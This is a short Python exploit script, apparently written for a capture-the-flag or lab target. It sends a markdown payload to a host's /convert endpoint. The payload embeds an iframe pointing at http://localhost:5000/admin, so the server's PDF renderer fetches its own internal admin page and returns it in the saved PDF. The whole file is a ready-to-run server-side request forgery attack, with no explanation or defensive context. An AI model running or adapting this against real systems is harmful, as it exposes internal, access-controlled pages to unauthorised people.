#!/bin/python3
import sys

import requests

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <ip>")
    sys.exit(1)

ip = sys.argv[1]

url = f"http://{ip}/convert"
payload = {"md": '<iframe src="http://localhost:5000/admin"/>'}
headers = {"Content-Type": "application/x-www-form-urlencoded"}

response = requests.post(url, data=payload, headers=headers)

if response.status_code == 200:
    content_disposition = response.headers.get("Content-Disposition")
    if content_disposition:
        filename = content_disposition.split("filename=")[1]
    else:
        filename = "output.pdf"

    with open(filename, "wb") as file:
        file.write(response.content)
        print(f"PDF file saved as {filename}")
else:
    print("Request failed with status code", response.status_code)
